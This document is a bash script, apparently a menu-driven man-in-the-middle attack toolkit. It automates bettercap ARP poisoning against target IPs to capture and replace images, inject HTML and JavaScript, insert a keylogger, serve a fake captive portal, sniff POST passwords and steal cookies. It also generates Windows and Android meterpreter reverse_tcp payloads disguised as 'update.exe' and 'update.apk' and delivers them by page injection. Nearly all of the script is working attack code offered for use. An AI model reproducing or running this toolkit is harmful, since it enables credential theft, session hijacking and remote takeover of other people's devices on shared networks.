#!/bin/bash
echo " .----------------. .----------------. .----------------. .----------------. 
| .--------------. | .--------------. | .--------------. | .--------------. |
| | ____    ____ | | |     _____    | | |  _________   | | | ____    ____ | |
| ||_   \  /   _|| | |    |_   _|   | | | |  _   _  |  | | ||_   \  /   _|| |
| |  |   \/   |  | | |      | |     | | | |_/ | | \_|  | | |  |   \/   |  | |
| |  | |\  /| |  | | |      | |     | | |     | |      | | |  | |\  /| |  | |
| | _| |_\/_| |_ | | |     _| |_    | | |    _| |_     | | | _| |_\/_| |_ | |
| ||_____||_____|| | |    |_____|   | | |   |_____|    | | ||_____||_____|| |
| |              | | |              | | |              | | |              | |
| '--------------' | '--------------' | '--------------' | '--------------' |
 '----------------' '----------------' '----------------' '----------------' "
echo ":::::::::::::::::::::::::IP 2017 BY GSELF-18:::::::::::::::::::::::::::::::::::"
echo "Demonstrating MITM Attacks In A Local Network By Creating Fake AP(Access Point)"
echo ":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo "Press 1  For Capturing Images "
echo "Press 2  For Replacing Images "
echo "Press 3  For Injecting HTML Code In Webpages"
echo "Press 4  For Injecting JavaScript In Webpages"
echo "Press 5  For Getting Access To Device In A Network (Window PC)"
echo "Press 6  For Getting Access To Device In A Network (Android)"
echo "Press 7  For Exploiting Vulnerable Service Running On Device"
echo "Press 8  For Inserting Keylogger In Target Machine"
echo "Press 9  For Creating Fake Captive Portal "
echo "Press 10 For Sniffing Password"
echo "Press 11 For Stealing cookie"
echo ":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo "*******************************************************************************"
echo ":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo "*******************************************************************************"
read num
echo "**************************************************************************************"
case $num in
	1) echo "In this module you are going to capture images in network"
	echo "***********************************************************************************"
	echo "[Warning] you have to start command 'driftnet -i wlan0 ' in a new tab to see images"   
	sleep 10
	bettercap -I wlan0 -O bettercap_extrabacon.log -S ARP -X ;;
	2) echo "In this module you are going to replace images in network"	 
	echo "************************************************************"	
	read -p "[?]Enter the IP of target host " ip
	read -p "[?]Enter the gateway IP " ip2
        read -p "Enter the path of image with which you want replace it " path	   
	echo "3"
	sleep 1
	echo "2"
	sleep 1
	echo "1"
	sleep 1
	bettercap -I wlan0 -O bettercap_proxy.log -S ARP -X --proxy --proxy-module replace_images --httpd --httpd-path $path --gateway $ip2 --target $ip ;;
	3)echo "In this module we are going to inject html code in webpages"
	echo "*************************************************************"	
	read -p "[?]Enter the IP of target host,for multiple target enter ip separated by commas " ip
        read -p "[?]Enter the gateway IP " ip2
	read -p "Enter the path of html code which you inject " path
	echo "3"
        sleep 1
        echo "2"
        sleep 1
        echo "1"
        sleep 1
	bettercap -I wlan0 -O bettercap_proxy.log -S ARP -X --proxy-module injecthtml --html-file $path  --gateway $ip2 --target $ip;;
	4)echo "In this module we are going to inject javascript code in webpages"
	echo "*******************************************************************"
        read -p "[?]Enter the IP of target host,for multiple target enter ip separated by commas " ip
        read -p "[?]Enter the gateway IP " ip2
        read -p "Enter the path of javascript code which you want to inject " path
        echo "3"
        sleep 1
        echo "2"
        sleep 1
        echo "1"
        sleep 1
        bettercap -I wlan0 -O bettercap_proxy.log -S ARP -X --proxy-module injectjs --js-file $path  --gateway $ip2 --target $ip;;
	5)echo "In this module we are going to get control of devices in a network(Windows)"
	echo "*****************************************************************************"	
	read -p "[?]Enter the IP of your machine " ip
	read -p "[?]Enter the port no. b/w[1024-65000] " p
	echo "By default we are using 'windows/meterpreter/reverse_tcp' payload"
	echo "Creating Payload"
	sleep 2
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$p -f exe -o /root/ip/html5/update.exe
	echo "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
	echo "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
	echo "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
	read -p "[?]Enter the IP of target host,for multiple target enter ip separated by commas " ip
        read -p "[?]Enter the gateway IP " ip2
	bettercap -I wlan0 -O bettercap_proxy.log -S ARP -X --proxy-module injecthtml --html-file /root/ip/html5/index.html  --gateway $ip2 --target $ip;;
	6)echo "In this module we are going to get control of devices in a network(Android)"
	echo "*****************************************************************************"
        read -p "[?]Enter the IP of your machine " ip
        read -p "[?]Enter the port no. b/w[1024-65000] " p
        echo "By default we are using 'Android/meterpreter/reverse_tcp' payload"
        echo "Creating Payload"
        sleep 2
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$p -o /root/ip/html6/update.apk
        echo "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
        echo "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
        echo "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
        read -p "[?]Enter the IP of target host,for multiple target enter ip separated by commas " ip
        read -p "[?]Enter the gateway IP " ip2
        bettercap -I wlan0 -O bettercap_proxy.log -S ARP -X --proxy-module injecthtml --html-file /root/ip/html6/index.html  --gateway $ip2 --target $ip;;
	7)echo "In this module we are going to find vulnerable services running on device"
	echo "***************************************************************************"
	read -p"[?]Enter the IP address of target host " ip
	echo ":::::::::::::::::Nmap result:::::::::::::::::::"
	nmap -sV $ip
	echo ":::::::::::::::::::::::::::::::::::::::::::::::"
	echo "Search exploit in metasploit database"
	msfconsole  ;;
	8)echo "In this module we are going to insert keylogger in target machine"
	echo "*******************************************************************"
	echo "Type 'msfconsole -r key.rc' in a new terminal it will give you link and paste it in /root/b/html8/key.js file"
	echo "Press enter to continue"
	read enter
	read -p "[?]Enter the IP of target host,for multiple target enter ip separated by commas " ip
        read -p "[?]Enter the gateway IP " ip2
        echo "Inserting Keylogger in target machine"
        sleep 2
        bettercap -I wlan0 -O bettercap_proxy.log -S ARP -X --proxy-module injectjs --js-file /root/ip/html8/inject.js  --gateway $ip2 --target $ip;;
	9)echo "In this module we are creating fake captive portal"
	echo   "**************************************************"	
	read -p "[?]Enter the IP of target host,for multiple target enter ip separated by commas " ip
        read -p "[?]Enter the gateway IP " ip2
	bettercap -I wlan0 -O bettercap_proxy.log -S ARP -X --proxy-module injectjs --js-file /root/ip/html/captive.js  --gateway $ip2 --target $ip;;
	10)echo "In this module we are going to sniff password going through POST method in network "
	echo   "**************************************************************"	
	echo "ARP Poisoning Whole Network To Capture Packets"
	echo "Start Wireshark "
        echo "Type 'http.requestmethod==POST' In Filter of Wireshark to Sniff Password "
	sleep 2
	bettercap -I wlan0 -O bettercap_proxy.log -S ARP -X;; 
	11)echo "In this module we are going to steal cookie of target machine"
	echo   "**************************************************************"	
	read -p "[?]Enter the IP of target host,for multiple target enter ip separated by commas " ip
        read -p "[?]Enter the gateway IP " ip2
	echo "Type this command 'python -m SimpleHTTPServer' in /root/b/html11 directory to see cookies"
	echo "Press Enter to continue"
	read enter
	bettercap -I wlan0 -O bettercap_proxy.log -S ARP -X --proxy-module injectjs --js-file /root/ip/html11/inject.js  --gateway $ip2 --target $ip;;
	
esac

